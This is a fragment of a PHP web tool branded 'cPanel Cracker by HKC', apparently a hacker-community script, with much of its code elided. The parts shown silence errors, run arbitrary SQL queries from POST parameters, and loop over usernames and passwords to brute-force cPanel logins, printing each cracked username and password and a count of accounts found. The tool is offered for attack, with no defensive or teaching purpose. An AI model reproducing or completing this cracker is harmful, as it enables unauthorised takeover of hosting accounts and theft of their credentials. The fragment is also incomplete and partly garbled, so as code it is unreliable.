<html>
<title>-=[ cPanel Cracker by HKC ]=-</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Cpanel Cracker By HKC
*/
@session_start();
@error_reporting(0);
...
echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysql_l']; $sql->pass = $_POST['mysql_p']; $sql->base = $_POST['mysql_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
 ...
 echo "<br><title>Cpanel Cracker by C0die r00t</title><form name=form method=POST>";
...
<table style="width: 100%" class="style1" dir="rtl">
        <tr>
                <td class="style9"><strong>ãæÌÉ ÇáÃæãÑ</strong></td>
        </tr>
        <tr>
                <td class="style13">
                                <form method="post">
   ...
   if($_POST['type'] == 'passwd'){
    ...
    foreach($a1 as $user )
    {
         ...
         for($i=0;$i<=$id2;$i++)
        {
           ...
           {
               echo "HKC~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel (HKC)</b>";
...
<input name="page" type="hidden" value="find">                                 
    ...
    <tr>
        <td valign="top" bgcolor="#151515"><center><strong><img src="http://i.imgur.com/NOx7Gwc.png" /><br>
                </strong>
                <a href="http://facebook.com/hackerkocancommunity" class="style2"><strong>-=[ Cpanel Cracker By HKC ]=-</strong></a></center></td>
    </tr>
    <tr>
    <td>
